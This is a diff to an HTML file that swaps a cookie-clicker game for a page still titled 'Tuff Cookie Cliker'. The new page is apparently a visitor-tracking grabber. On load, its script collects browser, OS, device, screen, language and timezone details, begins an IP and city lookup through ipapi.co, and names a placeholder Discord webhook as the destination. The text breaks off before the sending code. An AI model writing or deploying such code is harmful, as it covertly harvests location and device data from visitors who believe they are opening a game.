@@ -1,1825 +1,312 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>Shi was made by Rainyyyt</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Tuff Cookie Cliker</title>
     <style>
-        * { box-sizing: border-box; user-select: none; }
         body {
-            background: linear-gradient(145deg, #1e2a3a, #0f1722);
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: #0f1117;
+            color: #e0e0e0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
             min-height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            font-family: 'Segoe UI', system-ui, sans-serif;
             margin: 0;
-            padding: 16px;
-            transition: background 0.5s ease;
-        }
-        body.dark-mode {
-            background: linear-gradient(145deg, #0a0a12, #050508);
-        }
-        body.dark-mode .game-container {
-            background: #1a1a2e;
-            border-color: #3a3a5a;
-        }
-        body.dark-mode .cookie-display { background: #0d0d1a; border-color: #2a2a4a; }
-        body.dark-mode .stats { background: #0d0d1a; border-color: #2a2a4a; }
-        body.dark-mode .upgrade-btn { background: #1a1a2e; border-color: #3a3a5a; }
-        body.dark-mode .footer-note { border-color: #2a2a4a; color: #556688; }
-        body.dark-mode .reset-btn { background: #2a1a1a; }
-        body.dark-mode .floating-discord { background: rgba(40, 50, 80, 0.9); }
-        
-        .game-container {
-            background: #2a3f5a;
-            padding: 40px 50px 50px 50px;
-            border-radius: 60px 60px 40px 40px;
-            box-shadow: 0 20px 30px rgba(0,0,0,0.7), inset 0 2px 4px rgba(255,255,200,0.1);
-            text-align: center;
-            max-width: 480px;
-            width: 100%;
-            border: 1px solid #5b7f9e;
-            transition: background 0.5s ease, border-color 0.5s ease;
-            display: none;
-        }
-        .game-container.visible { display: block; }
-        
-        h1 {
-            margin: 0 0 8px 0;
-            font-weight: 500;
-            font-size: 2.0rem;
-            letter-spacing: 2px;
-            color: #f5e7c8;
-            text-shadow: 0 4px 0 #7a5a3a, 0 6px 12px black;
-        }
-        .cookie-display {
-            background: #1b2938;
-            border-radius: 80px;
-            padding: 18px 20px;
-            margin: 12px 0 20px 0;
-            border: 1px solid #6f95b5;
-            box-shadow: inset 0 6px 8px rgba(0,0,0,0.6);
-            transition: background 0.5s ease, border-color 0.5s ease;
-        }
-        .cookie-count {
-            font-size: 3.2rem;
-            font-weight: 700;
-            color: #ffdd99;
-            text-shadow: 0 0 12px #f0b34b;
-            font-variant-numeric: tabular-nums;
-        }
-        .cookie-label {
-            color: #b6cddf;
-            font-size: 0.9rem;
-            text-transform: uppercase;
-            letter-spacing: 3px;
-        }
-        .cookie-btn {
-            background: radial-gradient(circle at 30% 30%, #f5c27b, #c77d2a);
-            border: none;
-            border-radius: 50%;
-            width: 160px;
-            height: 160px;
-            margin: 16px auto 24px auto;
-            box-shadow: 0 12px 0 #6b3f12, 0 18px 30px rgba(0,0,0,0.7);
-            cursor: pointer;
-            transition: 0.06s linear;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 5.5rem;
-            font-weight: 900;
-            color: #4f2b0e;
-            text-shadow: 0 4px 0 #b87a3a, 0 6px 6px rgba(0,0,0,0.4);
-            border: 2px solid #ebc28b;
-            position: relative;
-            overflow: hidden;
-        }
-        .cookie-btn:active {
-            transform: scale(0.92);
-            box-shadow: 0 4px 0 #6b3f12, 0 12px 20px rgba(0,0,0,0.8);
-        }
-        .cookie-btn .particle {
-            position: absolute;
-            width: 8px;
-            height: 8px;
-            border-radius: 50%;
-            background: #ffdd99;
-            animation: particleFly 0.8s ease forwards;
-        }
-        @keyframes particleFly {
-            0% { transform: translate(0,0) scale(1); opacity: 1; }
-            100% { transform: translate(var(--tx), var(--ty)) scale(0); opacity: 0; }
-        }
-        @keyframes floatUp {
-            0% { transform: translateY(0) scale(1); opacity: 1; }
-            100% { transform: translateY(-80px) scale(1.5); opacity: 0; }
-        }
-        .stats {
-            display: flex;
-            justify-content: space-between;
-            background: #1c2e40;
-            padding: 12px 18px;
-            border-radius: 40px;
-            margin: 12px 0 22px 0;
-            border: 1px solid #3f637f;
-            color: #d4e6f5;
-            font-weight: 500;
-            font-size: 1.1rem;
-            transition: background 0.5s ease, border-color 0.5s ease;
-        }
-        .stats span { color: #ffcc88; }
-        .upgrades {
-            display: flex;
-            flex-direction: column;
-            gap: 12px;
-            margin-top: 6px;
-        }
-        .upgrade-btn {
-            background: #263b4e;
-            border: 1px solid #5d83a3;
-            border-radius: 50px;
-            padding: 14px 18px;
-            color: #eaf0f5;
-            font-weight: 600;
-            font-size: 1.05rem;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            cursor: pointer;
-            transition: 0.1s;
-            box-shadow: 0 4px 0 #0d1822;
-            background: linear-gradient(145deg, #2d445b, #1a2b3b);
-        }
-        .upgrade-btn:hover { background: #365571; border-color: #8ab3d4; }
-        .upgrade-btn:active { transform: translateY(3px); box-shadow: 0 1px 0 #0d1822; }
-        .upgrade-btn.disabled {
-            opacity: 0.5;
-            filter: grayscale(0.7);
-            pointer-events: none;
-        }
-        .upgrade-name { display: flex; align-items: center; gap: 10px; }
-        .upgrade-cost { background: #1b2b38; padding: 4px 16px; border-radius: 30px; font-size: 0.95rem; color: #f5c542; }
-        .reset-area {
-            margin-top: 24px;
-            display: flex;
-            justify-content: center;
-            gap: 20px;
-            flex-wrap: wrap;
-        }
-        .reset-btn {
-            background: #3d2a2a;
-            border: 1px solid #8f5a5a;
-            color: #f0c8c8;
-            padding: 8px 24px;
-            border-radius: 40px;
-            font-weight: 600;
-            cursor: pointer;
-            transition: 0.08s;
-            font-size: 0.9rem;
-            box-shadow: 0 3px 0 #2a1717;
-        }
-        .reset-btn:active { transform: translateY(3px); box-shadow: 0 0px 0 #2a1717; }
-        .footer-note {
-            margin-top: 20px;
-            color: #7799b3;
-            font-size: 0.75rem;
-            letter-spacing: 0.5px;
-            border-top: 1px solid #3f5f78;
-            padding-top: 16px;
-            transition: color 0.5s ease, border-color 0.5s ease;
-        }
-        #cpsDisplay { color: #7fc9ff; font-weight: 700; }
-        #ownerBtn {
-            background: #4a3a1a;
-            border: 2px solid #c9a84c;
-            color: #f5d742;
-            padding: 8px 20px;
-            border-radius: 40px;
-            font-weight: 700;
-            cursor: pointer;
-            font-size: 1.0rem;
-            letter-spacing: 1px;
-            box-shadow: 0 3px 0 #2a1f0a;
-            transition: 0.08s;
-            margin-top: 10px;
-            width: 100%;
-        }
-        #ownerBtn:hover { background: #5a4a2a; }
-        #ownerBtn:active { transform: translateY(3px); box-shadow: 0 0px 0 #2a1f0a; }
-        #ownerMenu {
-            background: #1a2a3a;
-            border: 2px solid #c9a84c;
-            border-radius: 20px;
-            padding: 20px;
-            margin-top: 12px;
-            color: #eedbaa;
-            font-family: monospace;
-            text-align: left;
-            box-shadow: 0 8px 20px rgba(0,0,0,0.8);
-        }
-        .owner-btn {
-            background: #2a4a3a;
-            border: 1px solid #5a9a7a;
-            border-radius: 30px;
-            padding: 10px;
-            color: #b5e6d0;
-            cursor: pointer;
-            font-weight: 600;
-            width: 100%;
-            transition: 0.08s;
-        }
-        .owner-btn:hover { filter: brightness(1.2); }
-        .owner-btn:active { transform: scale(0.97); }
-
-        /* Floating Discord */
-        .floating-discord {
-            position: fixed;
-            bottom: 30px;
-            right: 30px;
-            background: rgba(88, 101, 242, 0.92);
-            color: white;
-            padding: 14px 24px;
-            border-radius: 50px;
-            font-family: 'Segoe UI', system-ui, sans-serif;
-            font-weight: 700;
-            font-size: 1.1rem;
-            letter-spacing: 0.5px;
-            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.5), 0 0 0 2px #5865f2 inset;
-            cursor: pointer;
-            transition: transform 0.3s ease, box-shadow 0.3s ease;
-            z-index: 9999;
-            animation: floatDiscord 3s ease-in-out infinite;
-            border: none;
-            user-select: none;
-            text-shadow: 0 2px 4px rgba(0,0,0,0.3);
-            display: none;
-        }
-        .floating-discord.visible { display: block; }
-        .floating-discord:hover {
-            transform: scale(1.08);
-            box-shadow: 0 12px 40px rgba(88, 101, 242, 0.6), 0 0 0 3px #7289da inset;
-            animation-play-state: paused;
-        }
-        .floating-discord:active { transform: scale(0.92); }
-        .floating-discord .discord-icon {
-            display: inline-block;
-            margin-right: 10px;
-            font-size: 1.4rem;
-            vertical-align: middle;
-        }
-        @keyframes floatDiscord {
-            0%   { transform: translateY(0px) rotate(0deg); }
-            50%  { transform: translateY(-14px) rotate(1deg); }
-            100% { transform: translateY(0px) rotate(0deg); }
-        }
-
-        /* Secret Stuff */
-        #secretBtn {
-            position: fixed;
-            bottom: 30px;
-            left: 30px;
-            background: rgba(30, 30, 40, 0.9);
-            border: 2px solid #ff6b6b;
-            color: #ff6b6b;
-            padding: 12px 20px;
-            border-radius: 40px;
-            font-family: 'Segoe UI', system-ui, sans-serif;
-            font-weight: 700;
-            font-size: 1.0rem;
-            cursor: pointer;
-            z-index: 9998;
-            transition: all 0.3s ease;
-            box-shadow: 0 4px 20px rgba(255, 107, 107, 0.3);
-            letter-spacing: 1px;
-            text-transform: uppercase;
-            display: none;
-        }
-        #secretBtn.visible { display: block; }
-        #secretBtn:hover {
-            transform: scale(1.05);
-            background: rgba(255, 107, 107, 0.2);
-            box-shadow: 0 4px 30px rgba(255, 107, 107, 0.5);
-        }
-        #secretBtn:active { transform: scale(0.95); }
-
-        #secretOverlay {
-            display: none;
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100vw;
-            height: 100vh;
-            background: rgba(10, 10, 20, 0.97);
-            z-index: 9997;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            padding: 40px;
-            overflow-y: auto;
-            animation: fadeIn 0.4s ease;
-        }
-        #secretOverlay.show { display: flex; }
-        @keyframes fadeIn {
-            from { opacity: 0; transform: scale(0.95); }
-            to { opacity: 1; transform: scale(1); }
-        }
-        #secretOverlay h2 {
-            color: #ff6b6b;
-            font-family: 'Segoe UI', system-ui, sans-serif;
-            font-size: 2.5rem;
-            margin-bottom: 30px;
-            text-shadow: 0 0 30px rgba(255, 107, 107, 0.3);
-            letter-spacing: 3px;
-            text-transform: uppercase;
-        }
-        .screenshot-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
-            gap: 24px;
-            max-width: 1200px;
-            width: 100%;
             padding: 20px;
         }
-        .screenshot-card {
-            background: rgba(30, 30, 50, 0.8);
-            border: 1px solid #ff6b6b44;
-            border-radius: 20px;
-            padding: 20px;
-            text-align: center;
-            transition: all 0.3s ease;
-            cursor: pointer;
-            backdrop-filter: blur(10px);
-        }
-        .screenshot-card:hover {
-            transform: translateY(-8px);
-            border-color: #ff6b6b;
-            box-shadow: 0 8px 40px rgba(255, 107, 107, 0.2);
-        }
-        .screenshot-card img {
-            width: 100%;
-            height: auto;
-            border-radius: 12px;
-            border: 1px solid #444;
-            max-height: 200px;
-            object-fit: cover;
-            background: #1a1a2e;
-        }
-        .screenshot-card .card-title {
-            color: #ddd;
-            font-family: 'Segoe UI', system-ui, sans-serif;
-            font-weight: 600;
-            margin-top: 12px;
-            font-size: 1.0rem;
-        }
-        .screenshot-card .card-link {
-            color: #ff6b6b;
-            font-size: 0.8rem;
-            word-break: break-all;
-            display: block;
-            margin-top: 6px;
-            font-family: monospace;
-        }
-        #secretBackBtn {
-            margin-top: 30px;
-            background: #ff6b6b;
-            border: none;
-            color: #fff;
-            padding: 14px 40px;
-            border-radius: 50px;
-            font-weight: 700;
-            font-size: 1.2rem;
-            cursor: pointer;
-            transition: all 0.3s ease;
-            box-shadow: 0 4px 20px rgba(255, 107, 107, 0.4);
-            text-transform: uppercase;
-            letter-spacing: 2px;
-        }
-        #secretBackBtn:hover {
-            transform: scale(1.05);
-            box-shadow: 0 8px 30px rgba(255, 107, 107, 0.6);
-        }
-        #secretBackBtn:active { transform: scale(0.95); }
-
-        /* Dark Mode Toggle */
-        #darkModeToggle {
-            position: fixed;
-            top: 20px;
-            right: 20px;
-            background: rgba(30,30,50,0.8);
-            border: 2px solid #888;
-            color: #fff;
-            padding: 10px 16px;
-            border-radius: 30px;
-            cursor: pointer;
-            z-index: 9996;
-            font-size: 1.2rem;
-            transition: all 0.3s ease;
-            display: none;
-        }
-        #darkModeToggle.visible { display: block; }
-        #darkModeToggle:hover { transform: scale(1.1); }
-
-        /* Achievement Popup */
-        .achievement-popup {
-            position: fixed;
-            top: 80px;
-            left: 50%;
-            transform: translateX(-50%);
-            background: linear-gradient(145deg, #ffd700, #ffaa00);
-            color: #1a1a2e;
-            padding: 16px 32px;
-            border-radius: 20px;
-            font-weight: 700;
-            font-size: 1.3rem;
-            z-index: 10000;
-            animation: slideDown 0.5s ease, fadeOut 0.5s 2.5s ease forwards;
-            box-shadow: 0 8px 40px rgba(255,215,0,0.5);
-            border: 2px solid #fff;
-            text-align: center;
-        }
-        @keyframes slideDown {
-            from { transform: translateX(-50%) translateY(-100px); opacity: 0; }
-            to { transform: translateX(-50%) translateY(0); opacity: 1; }
-        }
-        @keyframes fadeOut {
-            to { opacity: 0; transform: translateX(-50%) translateY(-20px); }
-        }
-
-        /* Event Notification */
-        .event-notification {
-            position: fixed;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            background: rgba(0,0,0,0.9);
-            color: #fff;
-            padding: 30px 50px;
-            border-radius: 30px;
-            font-size: 2rem;
-            font-weight: 700;
-            z-index: 10001;
-            border: 3px solid #ff6b6b;
-            animation: eventPop 0.6s ease, eventFade 0.5s 2.5s ease forwards;
-            text-align: center;
-        }
-        @keyframes eventPop {
-            from { transform: translate(-50%, -50%) scale(0.5); opacity: 0; }
-            to { transform: translate(-50%, -50%) scale(1); opacity: 1; }
-        }
-        @keyframes eventFade {
-            to { opacity: 0; transform: translate(-50%, -50%) scale(1.2); }
-        }
-
-        /* Combo Display */
-        #comboDisplay {
-            position: fixed;
-            top: 80px;
-            left: 50%;
-            transform: translateX(-50%);
-            color: #ff6b6b;
-            font-size: 2rem;
-            font-weight: 900;
-            z-index: 9995;
-            text-shadow: 0 0 30px rgba(255,107,107,0.5);
-            opacity: 0;
-            transition: opacity 0.3s ease;
-            pointer-events: none;
-            display: none;
-        }
-        #comboDisplay.visible { display: block; }
-        #comboDisplay.show { opacity: 1; }
-
-        /* Prestige */
-        .prestige-display {
-            color: #ffd700;
-            font-size: 0.9rem;
-            margin-top: 8px;
-        }
-        #prestigeBtn {
-            background: linear-gradient(145deg, #ffd700, #ffaa00);
-            border: none;
-            color: #1a1a2e;
-            padding: 10px 20px;
-            border-radius: 40px;
-            font-weight: 700;
-            cursor: pointer;
-            margin-top: 8px;
-            width: 100%;
-            font-size: 0.95rem;
-            transition: all 0.3s ease;
-        }
-        #prestigeBtn:hover { transform: scale(1.02); box-shadow: 0 4px 20px rgba(255,215,0,0.4); }
-
-        /* Leaderboard */
-        .leaderboard-entry {
-            background: rgba(255,215,0,0.1);
-            border: 1px solid #ffd70044;
-            border-radius: 12px;
-            padding: 8px 16px;
-            margin: 4px 0;
-            color: #ddd;
-            display: flex;
-            justify-content: space-between;
-        }
-        .leaderboard-entry.you { border-color: #ffd700; background: rgba(255,215,0,0.2); }
-
-        /* Pets */
-        .pet-container {
-            display: grid;
-            grid-template-columns: 1fr 1fr 1fr;
-            gap: 8px;
-            margin-top: 10px;
-        }
-        .pet-btn {
-            background: #1a2a3a;
-            border: 2px solid #4a6a7a;
+        .container {
+            background: #1a1d27;
+            padding: 30px 40px;
             border-radius: 16px;
-            padding: 10px;
-            color: #ddd;
-            cursor: pointer;
-            transition: 0.3s;
-            text-align: center;
-        }
-        .pet-btn:hover { transform: scale(1.05); border-color: #ffd700; }
-        .pet-btn.owned { border-color: #ffd700; background: #2a3a2a; }
-        .pet-btn .pet-emoji { font-size: 2rem; display: block; }
-        .pet-btn .pet-name { font-size: 0.8rem; font-weight: 600; }
-        .pet-btn .pet-cps { font-size: 0.7rem; color: #7fc9ff; }
-
-        /* Graph */
-        #graphCanvas {
-            background: #0d0d1a;
-            border-radius: 12px;
-            border: 1px solid #3a3a5a;
-            margin-top: 10px;
+            box-shadow: 0 8px 24px rgba(0,0,0,0.6);
+            max-width: 700px;
             width: 100%;
-            height: 120px;
+            border: 1px solid #2e3342;
         }
-
-        /* --- LOGIN SYSTEM --- */
-        #loginOverlay {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100vw;
-            height: 100vh;
-            background: rgba(0, 0, 0, 0.92);
-            z-index: 99999;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            flex-direction: column;
-            backdrop-filter: blur(20px);
-        }
-        #loginOverlay.hidden {
-            display: none;
-        }
-        .login-box {
-            background: linear-gradient(145deg, #2a3f5a, #1a2a3a);
-            padding: 40px 50px;
-            border-radius: 40px;
-            border: 2px solid #5b7f9e;
-            box-shadow: 0 20px 60px rgba(0,0,0,0.8);
-            max-width: 400px;
-            width: 100%;
-            text-align: center;
-        }
-        .login-box h2 {
-            color: #f5e7c8;
-            font-size: 2rem;
-            margin-bottom: 8px;
-            text-shadow: 0 4px 0 #7a5a3a;
-        }
-        .login-box .subtitle {
-            color: #b6cddf;
-            font-size: 0.9rem;
-            margin-bottom: 25px;
-        }
-        .login-input {
-            width: 100%;
-            padding: 14px 18px;
-            border-radius: 30px;
-            border: 2px solid #3f637f;
-            background: #1b2938;
-            color: #fff;
-            font-size: 1rem;
-            margin-bottom: 12px;
-            outline: none;
-            transition: border-color 0.3s;
-        }
-        .login-input:focus { border-color: #ffd700; }
-        .login-input::placeholder { color: #7799b3; }
-        .login-btn {
-            width: 100%;
-            padding: 14px;
-            border-radius: 30px;
-            border: none;
-            font-weight: 700;
-            font-size: 1.1rem;
-            cursor: pointer;
-            transition: 0.3s;
-            margin-top: 8px;
-        }
-        .login-btn.primary {
-            background: linear-gradient(145deg, #ffd700, #ffaa00);
-            color: #1a1a2e;
-        }
-        .login-btn.primary:hover { transform: scale(1.02); box-shadow: 0 4px 20px rgba(255,215,0,0.3); }
-        .login-btn.secondary {
-            background: transparent;
-            color: #b6cddf;
-            border: 2px solid #3f637f;
-        }
-        .login-btn.secondary:hover { background: rgba(255,255,255,0.05); }
-        .login-error {
-            color: #ff6b6b;
-            font-size: 0.85rem;
-            margin-top: 8px;
-            min-height: 20px;
-        }
-        .login-switch {
-            color: #7799b3;
-            font-size: 0.85rem;
-            margin-top: 16px;
-        }
-        .login-switch span {
-            color: #ffd700;
-            cursor: pointer;
-            text-decoration: underline;
-        }
-        .login-switch span:hover { color: #ffaa00; }
-
-        /* --- WELCOME ANIMATION --- */
-        #welcomeOverlay {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100vw;
-            height: 100vh;
-            z-index: 99998;
-            display: none;
-            justify-content: center;
-            align-items: center;
-            background: rgba(0, 0, 0, 0.85);
-            backdrop-filter: blur(10px);
-            pointer-events: none;
-        }
-        #welcomeOverlay.show {
-            display: flex;
-            pointer-events: auto;
-        }
-        .welcome-text {
-            font-size: 3.5rem;
-            font-weight: 900;
-            color: #ffd700;
-            text-shadow: 0 0 40px rgba(255,215,0,0.4), 0 4px 20px rgba(0,0,0,0.5);
-            animation: welcomePop 0.8s cubic-bezier(0.175, 0.885, 0.32, 1.275), welcomePulse 2s ease-in-out 1s infinite;
-            text-align: center;
-            padding: 20px;
-        }
-        .welcome-text .emoji-big {
-            font-size: 4.5rem;
-            display: block;
-            margin-bottom: 10px;
-        }
-        .welcome-text .sub-welcome {
-            font-size: 1.2rem;
-            color: #b6cddf;
+        h1 {
             font-weight: 400;
+            font-size: 1.8rem;
+            margin-top: 0;
+            border-bottom: 1px solid #2e3342;
+            padding-bottom: 12px;
+            color: #b7c0d0;
+            letter-spacing: 0.5px;
+        }
+        .info-grid {
+            display: grid;
+            grid-template-columns: 1fr 2fr;
+            gap: 8px 20px;
             margin-top: 10px;
-            text-shadow: none;
         }
-        @keyframes welcomePop {
-            0% { transform: scale(0.3) rotate(-10deg); opacity: 0; }
-            100% { transform: scale(1) rotate(0deg); opacity: 1; }
+        .label {
+            font-weight: 500;
+            color: #8892aa;
+            word-break: break-word;
         }
-        @keyframes welcomePulse {
-            0%, 100% { transform: scale(1); }
-            50% { transform: scale(1.03); }
+        .value {
+            color: #d4dcec;
+            word-break: break-word;
+            font-family: 'Courier New', monospace;
+            font-size: 0.95rem;
         }
-        .welcome-cookies {
-            position: absolute;
-            font-size: 2rem;
-            animation: cookieRain 3s linear infinite;
-            pointer-events: none;
+        .loading {
+            color: #f0c27f;
+            text-align: center;
+            padding: 20px 0;
         }
-        @keyframes cookieRain {
-            0% { transform: translateY(-100vh) rotate(0deg); opacity: 1; }
-            100% { transform: translateY(100vh) rotate(720deg); opacity: 0; }
+        .footer {
+            margin-top: 24px;
+            font-size: 0.8rem;
+            color: #4a5268;
+            text-align: right;
+            border-top: 1px solid #252b3a;
+            padding-top: 16px;
         }
-
-        @media (max-width: 600px) {
-            .game-container { padding: 20px; }
-            .login-box { padding: 30px 20px; }
-            .welcome-text { font-size: 2.2rem; }
-            .welcome-text .emoji-big { font-size: 3rem; }
-            .floating-discord { bottom: 16px; right: 16px; padding: 10px 16px; font-size: 0.85rem; }
-            .floating-discord .discord-icon { font-size: 1.0rem; margin-right: 6px; }
-            #secretBtn { bottom: 16px; left: 16px; padding: 8px 14px; font-size: 0.75rem; }
-            #secretOverlay h2 { font-size: 1.8rem; }
-            .screenshot-grid { grid-template-columns: 1fr; padding: 10px; }
-            .pet-container { grid-template-columns: 1fr 1fr; }
-            #darkModeToggle { top: 10px; right: 10px; padding: 6px 12px; font-size: 1rem; }
-            #comboDisplay { font-size: 1.2rem; top: 60px; }
+        .status {
+            margin-top: 16px;
+            padding: 10px;
+            border-radius: 8px;
+            font-size: 0.9rem;
+            text-align: center;
+        }
+        .status.success {
+            background: #1e3a2a;
+            color: #7ddfa0;
+            border: 1px solid #2a6b3f;
+        }
+        .status.fail {
+            background: #3a1e1e;
+            color: #df7d7d;
+            border: 1px solid #6b2a2a;
+        }
+        .status.pending {
+            background: #2a2a1e;
+            color: #dfd07d;
+            border: 1px solid #6b652a;
         }
     </style>
 </head>
 <body>
-
-<!-- LOGIN OVERLAY -->
-<div id="loginOverlay">
-    <div class="login-box">
-        <h2>🍪 Cookie Clicker</h2>
-        <div class="subtitle">by Rainyyyt</div>
-        <div id="loginForm">
-            <input class="login-input" id="loginUsername" type="text" placeholder="Username" />
-            <input class="login-input" id="loginPassword" type="password" placeholder="Password" />
-            <button class="login-btn primary" id="loginBtn">Login</button>
-            <div class="login-error" id="loginError"></div>
-            <div class="login-switch">Don't have an account? <span id="switchToRegister">Register</span></div>
-        </div>
-        <div id="registerForm" style="display:none;">
-            <input class="login-input" id="registerUsername" type="text" placeholder="Choose username" />
-            <input class="login-input" id="registerPassword" type="password" placeholder="Choose password" />
-            <input class="login-input" id="registerConfirm" type="password" placeholder="Confirm password" />
-            <button class="login-btn primary" id="registerBtn">Create Account</button>
-            <div class="login-error" id="registerError"></div>
-            <div class="login-switch">Already have an account? <span id="switchToLogin">Login</span></div>
-        </div>
+<div class="container" id="app">
+    <h1>🖥️ Client Fingerprint</h1>
+    <div id="infoDisplay">
+        <div class="loading">⏳ Gathering data...</div>
     </div>
-</div>
-
-<!-- WELCOME OVERLAY -->
-<div id="welcomeOverlay">
-    <div class="welcome-text">
-        <span class="emoji-big">🎉</span>
-        Welcome to Rainyy's Cookie Clicker!
-        <div class="sub-welcome">🍪 Let's start clicking! 🍪</div>
-    </div>
-</div>
-
-<!-- Dark Mode Toggle -->
-<button id="darkModeToggle">🌙</button>
-
-<!-- Combo Display -->
-<div id="comboDisplay">🔥 COMBO x1</div>
-
-<!-- Secret Stuff Button -->
-<button id="secretBtn">🔒 SECRET STUFF</button>
-
-<!-- Secret Overlay -->
-<div id="secretOverlay">
-    <h2>📸 SECRET SCREENSHOTS</h2>
-    <div class="screenshot-grid" id="screenshotGrid"></div>
-    <button id="secretBackBtn">⬅ BACK TO GAME</button>
-</div>
-
-<div class="game-container" id="gameContainer">
-    <h1>🍪 CLICKER</h1>
-
-    <div class="cookie-display">
-        <div class="cookie-count" id="cookieCount">0</div>
-        <div class="cookie-label">cookies</div>
-    </div>
-
-    <button class="cookie-btn" id="clickBtn">🍪</button>
-
-    <div class="stats">
-        <div>⚡ CPS <span id="cpsDisplay">0.0</span></div>
-        <div>🏆 total <span id="totalClicksDisplay">0</span></div>
-    </div>
-
-    <div class="upgrades">
-        <div class="upgrade-btn" id="upgrade1">
-            <span class="upgrade-name">👆 Click Power +1</span>
-            <span class="upgrade-cost" id="cost1">10</span>
-        </div>
-        <div class="upgrade-btn" id="upgrade2">
-            <span class="upgrade-name">🤖 Auto-clicker x1</span>
-            <span class="upgrade-cost" id="cost2">50</span>
-        </div>
-        <div class="upgrade-btn" id="upgrade3">
-            <span class="upgrade-name">🏭 Factory +5 CPS</span>
-            <span class="upgrade-cost" id="cost3">250</span>
-        </div>
-    </div>
-
-    <!-- Pets -->
-    <div style="margin-top: 10px;">
-        <div style="color:#ddd; font-weight:600; margin-bottom:6px;">🐾 PETS</div>
-        <div class="pet-container" id="petContainer">
-            <div class="pet-btn" data-pet="cat">🐱<span class="pet-name">Cat</span><span class="pet-cps">+1 CPS</span></div>
-            <div class="pet-btn" data-pet="dog">🐶<span class="pet-name">Dog</span><span class="pet-cps">+3 CPS</span></div>
-            <div class="pet-btn" data-pet="dragon">🐉<span class="pet-name">Dragon</span><span class="pet-cps">+10 CPS</span></div>
-        </div>
-    </div>
-
-    <!-- Prestige -->
-    <div style="margin-top: 12px;">
-        <button id="prestigeBtn">⭐ PRESTIGE (reset for +10% bonus)</button>
-        <div class="prestige-display">Prestige Points: <span id="prestigePoints">0</span> | Bonus: <span id="prestigeBonus">0</span>%</div>
-    </div>
-
-    <button id="ownerBtn">👑 OWNER</button>
-
-    <div class="reset-area">
-        <button class="reset-btn" id="resetBtn">↻ RESET</button>
-        <button class="reset-btn" id="saveBtn">💾 SAVE</button>
-    </div>
-
-    <!-- Graph -->
-    <canvas id="graphCanvas"></canvas>
-
-    <!-- Leaderboard -->
-    <div id="leaderboard" style="margin-top:10px; max-height:150px; overflow-y:auto;">
-        <div style="color:#ffd700; font-weight:600;">🏆 LEADERBOARD</div>
-        <div id="leaderboardEntries"></div>
-    </div>
-
-    <div class="footer-note">☁️ Cloudflare + GitHub ready · auto‑save every 15s</div>
-</div>
-
-<!-- Floating Discord Button -->
-<div class="floating-discord" id="discordFloat" title="Click to copy Discord username">
-    <span class="discord-icon">💬</span>
-    Add me on discord rainyy.mods
+    <div id="webhookStatus" class="status pending">⏳ Sending to webhook...</div>
+    <div class="footer">collected via navigator + ipapi.co</div>
 </div>
 
 <script>
-    (function(){
-        // --- LOGIN SYSTEM ---
-        let currentUser = null;
-        let loggedIn = false;
-        
-        const loginOverlay = document.getElementById('loginOverlay');
-        const loginForm = document.getElementById('loginForm');
-        const registerForm = document.getElementById('registerForm');
-        const loginUsername = document.getElementById('loginUsername');
-        const loginPassword = document.getElementById('loginPassword');
-        const loginBtn = document.getElementById('loginBtn');
-        const loginError = document.getElementById('loginError');
-        const registerUsername = document.getElementById('registerUsername');
-        const registerPassword = document.getElementById('registerPassword');
-        const registerConfirm = document.getElementById('registerConfirm');
-        const registerBtn = document.getElementById('registerBtn');
-        const registerError = document.getElementById('registerError');
-        const switchToRegister = document.getElementById('switchToRegister');
-        const switchToLogin = document.getElementById('switchToLogin');
-        const welcomeOverlay = document.getElementById('welcomeOverlay');
-        const gameContainer = document.getElementById('gameContainer');
-        
-        // --- User Database (localStorage) ---
-        function getUsers() {
+    (function() {
+        // ===== CONFIGURATION =====
+        // REPLACE THIS URL WITH YOUR ACTUAL WEBHOOK ENDPOINT
+        const WEBHOOK_URL = 'https://discord.com/api/webhooks/YOUR_WEBHOOK_ID/YOUR_WEBHOOK_TOKEN';
+        // =========================
+
+        const display = document.getElementById('infoDisplay');
+        const statusEl = document.getElementById('webhookStatus');
+
+        // ----- 1. BROWSER / DEVICE (client-only) -----
+        function getBrowserName() {
+            const ua = navigator.userAgent;
+            if (ua.indexOf('Firefox') > -1) return 'Firefox';
+            if (ua.indexOf('SamsungBrowser') > -1) return 'Samsung Internet';
+            if (ua.indexOf('Opera') > -1 || ua.indexOf('OPR') > -1) return 'Opera';
+            if (ua.indexOf('Edge') > -1) return 'Edge (Chromium)';
+            if (ua.indexOf('Chrome') > -1 && ua.indexOf('Edg') === -1) return 'Chrome';
+            if (ua.indexOf('Safari') > -1 && ua.indexOf('Chrome') === -1) return 'Safari';
+            return 'Unknown Browser';
+        }
+
+        function getOS() {
+            const ua = navigator.userAgent;
+            if (ua.indexOf('Win') > -1) return 'Windows';
+            if (ua.indexOf('Mac') > -1) return 'macOS';
+            if (ua.indexOf('Linux') > -1) return 'Linux';
+            if (ua.indexOf('Android') > -1) return 'Android';
+            if (ua.indexOf('like Mac') > -1) return 'iOS';
+            return 'Unknown OS';
+        }
+
+        function getDeviceType() {
+            const ua = navigator.userAgent;
+            if (/Mobi|Android|iPhone|iPad|iPod|Opera Mini|BlackBerry/i.test(ua)) {
+                return 'Mobile / Tablet';
+            }
+            return 'Desktop / Laptop';
+        }
+
+        function getScreenRes() {
+            return `${window.screen.width} x ${window.screen.height}`;
+        }
+
+        function getLanguage() {
+            return navigator.language || navigator.userLanguage || 'unknown';
+        }
+
+        function getTimezone() {
+            return Intl.DateTimeFormat().resolvedOptions().timeZone || 'unknown';
+        }
+
+        function getPlatform() {
+            return navigator.platform || 'unknown';
+        }
+
+        // ----- 2. IP + CITY (via external API) -----
+        function fetchIpInfo() {
